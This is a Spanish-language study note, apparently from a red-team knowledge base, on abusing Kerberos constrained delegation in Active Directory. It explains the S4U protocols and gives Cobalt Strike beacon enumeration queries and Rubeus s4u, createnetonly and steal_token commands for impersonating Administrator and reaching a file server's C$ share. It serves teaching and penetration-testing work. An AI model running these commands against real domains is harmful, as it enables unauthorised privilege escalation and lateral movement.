---
tags: [ad, kerberos, delegation, s4u, constrained-delegation]
status: completo
---

# Constrained Delegation

Introducida en Server 2003 como reemplazo a la unconstrained delegation. Usa la extensión **S4U** (Service for User) de Kerberos para limitar a qué servicios puede delegar un servicio.

---

## Protocolos S4U

| Protocolo | Descripción |
|-----------|-------------|
| **S4U2proxy** | El servicio obtiene un ST en nombre de un usuario para acceder a **otro** servicio. Requiere que el SPN destino esté en `msDS-AllowedToDelegateTo`. |
| **S4U2self** | El servicio obtiene un ST en nombre de un usuario **para sí mismo**. Útil cuando el usuario no autenticó con Kerberos (ej. NTLM). |

**Diferencias con Unconstrained Delegation:**
- Solo puede delegar a los SPNs listados en `msDS-AllowedToDelegateTo`
- No necesita el TGT del usuario

---

## Configuración

```
# Atributo que define a qué SPNs puede delegar
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1

# Flag para Protocol Transition (S4U2self → S4U2proxy)
TRUSTED_TO_AUTH_FOR_DELEGATION (UAC flag: 16777216)
```

### Enumeración

```
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

# Resultado:
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
```

```powershell
# Verificar si TRUSTED_TO_AUTH_FOR_DELEGATION está activo
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
# userAccountControl: 16781312

[System.Convert]::ToBoolean(16781312 -band 16777216)
# → True = Protocol Transition habilitado
```

---

## Flujo normal (Kerberos only)

```
1. Cliente → KDC: TGS-REQ (solicita ST para el front-end service)
2. KDC → Cliente: TGS-REP (devuelve ST)
3. Cliente → Front-end: AP-REQ (usa ST, autenticación)
4. Front-end cachea el ST del usuario
5. Front-end → KDC: TGS-REQ (incluye ST cacheado, pide ticket para back-end)
6. KDC verifica msDS-AllowedToDelegateTo → devuelve ST para back-end
7. Front-end → Back-end: AP-REQ (accede como el usuario)
```

Esto es **S4U2proxy**.

---

## Ataque: Con Protocol Transition habilitado

> Más fácil — el atacante puede impersonar a **cualquier usuario** del dominio.

**Condición:** `TRUSTED_TO_AUTH_FOR_DELEGATION` está activo en la cuenta comprometida.

**Flujo del ataque:**
1. Obtener TGT de la cuenta de máquina comprometida
2. S4U2self → ST del usuario objetivo para el servicio frontal
3. S4U2proxy → ST para el servicio destino (el de `msDS-AllowedToDelegateTo`)

```
# S4U2self + S4U2proxy en un solo comando
beacon> execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_base64> /impersonateuser:Administrator /nowrap

# Parámetros:
# /user         → cuenta configurada para delegación
# /msdsspn      → SPN destino (de msDS-AllowedToDelegateTo)
# /ticket       → TGT de la cuenta
# /impersonateuser → usuario a impersonar (cualquiera del dominio)
```

**Usar el ticket obtenido:**

```
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ST_base64>

beacon> steal_token <PID>
beacon> ls \\lon-fs-1\c$
```

---

## Ataque: Sin Protocol Transition (Kerberos only)

> Más limitado — solo se puede impersonar a usuarios que ya tienen un ST para el front-end service.

**Problema:** S4U2self devuelve un ticket **no forwardable**, que el KDC rechaza en S4U2proxy con `KDC_ERR_BADOPTION`.

> ⚠️ **Bronze Bit** (CVE-2020-17049) permitía falsificar el bit forwardable. **Ya está parchado.**

**Solución:** Usar un ST capturado de un usuario real que haya accedido al front-end service.

```
# Usar un ST capturado en vez de /impersonateuser
beacon> execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_base64> /tgs:<ST_capturado_base64> /nowrap

# /tgs → ST de un usuario real para el servicio front-end
```

---

## Resumen del flujo de ataque

```
Comprometer cuenta con msDS-AllowedToDelegateTo
        │
        ├─→ TRUSTED_TO_AUTH_FOR_DELEGATION = TRUE
        │       └─→ S4U2self (cualquier usuario) → S4U2proxy → ST para servicio destino
        │
        └─→ TRUSTED_TO_AUTH_FOR_DELEGATION = FALSE
                └─→ Capturar ST de usuario real → S4U2proxy directamente → ST para servicio destino
```

---

## Referencias

- [[05-ad-attacks/kerberos|Kerberos]] — Protocolo base
- [[05-ad-attacks/kerberos/unconstrained-delegation|Unconstrained Delegation]] — Variante sin restricciones
- [[05-ad-attacks/kerberos/rbcd|RBCD]] — Resource-Based Constrained Delegation (alternativa moderna)
- [[05-ad-attacks/kerberos/s4u2self|S4U2Self]] — Detalle del protocolo S4U2self
- [HackTricks — Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
